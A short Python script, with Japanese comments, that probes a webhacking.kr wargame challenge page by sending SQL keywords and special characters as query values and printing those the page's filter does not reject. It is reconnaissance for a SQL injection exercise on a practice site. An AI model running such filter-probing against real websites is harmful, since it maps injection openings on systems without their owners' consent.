



import requests
import string

# URLの設定
url = "https://webhacking.kr/challenge/web-09/index.php?no="

# テストするペイロード（適宜調整してください）
payloads = """
ADD
ALL
ALTER
AND
ANY
AS
ASC
BACKUP
BETWEEN
BY
CASE
CHECK
COLUMN
CONSTRAINT
CREATE
DATABASE
DEFAULT
DELETE
DESC
DISTINCT
DROP
EXEC
EXISTS
FOREIGN
FROM
FULL
GROUP
HAVING
IN
INDEX
INNER
INSERT
IS
JOIN
KEY
LEFT
LIKE
LIMIT
NOT
NULL
ON
OR
ORDER
OUTER
PRIMARY
PROCEDURE
RIGHT
ROWNUM
SELECT
SET
TABLE
TOP
TRUNCATE
UNION
UNIQUE
UPDATE
VALUES
VIEW
WHERE
WITH
IF
=
!
"
'
()
<>
<=
>=
+
-
*
/
%
;
,
.
|
&
#
?
~
0x
""".split("\n")

#payloads = ["and"]

# セッションを利用する場合（Cookieなどが必要な場合に備えて）
session = requests.Session()

# ヘッダー（必要に応じて設定）
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
}


for payload in payloads:
    try:
        response = session.get(url + payload)
        #print(response.text)
        # レスポンスの本文をチェック
        if "Denied" in response.text:
            pass
            #print(f"Payload '{payload}' found 'admin' in response!")
        else:
            print(payload)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred with payload '{payload}': {e}")